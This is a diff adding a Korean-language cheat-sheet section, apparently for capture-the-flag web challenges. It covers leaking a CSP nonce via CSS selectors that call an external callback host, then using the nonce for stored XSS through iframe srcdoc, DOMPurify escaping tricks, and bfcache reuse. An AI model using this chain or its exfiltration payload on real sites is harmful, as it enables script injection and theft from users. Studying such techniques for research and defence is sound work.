@@ -29,6 +29,18 @@ description: >
 time.sleep(8)
 ```
 
+### CSP Nonce CSS Leak + Cache Reuse XSS
+
+`script-src 'nonce-...'`가 있고 `style-src 'unsafe-inline'`이면, CSS selector로 CSP meta `content`의 nonce 조각을 외부 URL로 leak할 수 있다.
+대상 HTML이 `Cache-Control: no-cache`처럼 브라우저 캐시에 남고, XSS 데이터 API만 `no-store`라면 다음 체인이 가능하다.
+
+체크리스트:
+- `meta[content*="abc"]{background:url(//callback/l/abc)}`를 3-gram으로 생성해서 nonce를 복원한다.
+- nonce를 얻은 뒤 저장형 payload를 `<iframe srcdoc="<script nonce=...>..."></script>">` 형태로 교체한다.
+- 외부 stage iframe에서 top navigation이 막히면 `<iframe sandbox="allow-scripts allow-top-navigation" src=...>`를 쓴다.
+- `srcdoc`의 `</script>`는 최종 srcdoc 값에서는 literal이어야 실행된다. 바깥 attribute escape로 DOMPurify만 통과시키고, 너무 일찍 `&lt;/script&gt;`로 고정하지 않는다.
+- bfcache/cache 재진입은 hop 수를 bot 제한 시간 안에서 먼저 검증한다. cloudflared 경유는 hop당 1초 가까이 걸릴 수 있어 8~10 hop부터 테스트한다.
+
 ### Compression Dictionary Transport (CDT) 오염 -> mXSS
 
 `Use-As-Dictionary`의 `id=`가 user-controlled title/path로 조립되면 structured-header injection을 먼저 본다.
